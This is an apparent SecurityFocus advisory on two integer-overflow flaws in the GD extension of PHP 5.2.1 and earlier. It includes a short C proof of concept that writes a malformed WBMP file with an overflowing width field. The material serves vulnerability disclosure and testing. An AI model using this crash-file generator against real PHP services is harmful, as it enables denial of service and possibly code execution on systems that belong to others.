source: http://www.securityfocus.com/bid/23357/info

PHP's GD extension is prone to two integer-overflow vulnerabilities because it fails to ensure that integer values aren't overrun.

Successfully exploiting these issues allows attackers to crash the affected application, potentially denying service to legitimate users. Due to the nature of the issues, code execution may also be possible, but this has not been confirmed.

PHP 5.2.1 and prior versions are vulnerable. 

#define BUFSIZE 1000000

#include <stdio.h>

int main()
{
      int c;
      char buf[BUFSIZE];

      FILE *fp = fopen("test.wbmp","w");

      //write header
      c = 0;
      fputc(c,fp);
      fputc(c,fp);

      //write width = 2^32 / 4 + 1
      c = 0x84;
      fputc(c,fp);
      c = 0x80;
      fputc(c,fp);
      fputc(c,fp);
      fputc(c,fp);
      c = 0x01;
      fputc(c,fp);

      //write height = 4
      c = 0x04;
      fputc(c,fp);

      //write some data to cause overflow
      fwrite(buf,sizeof(buf),1,fp);

      fclose(fp);
}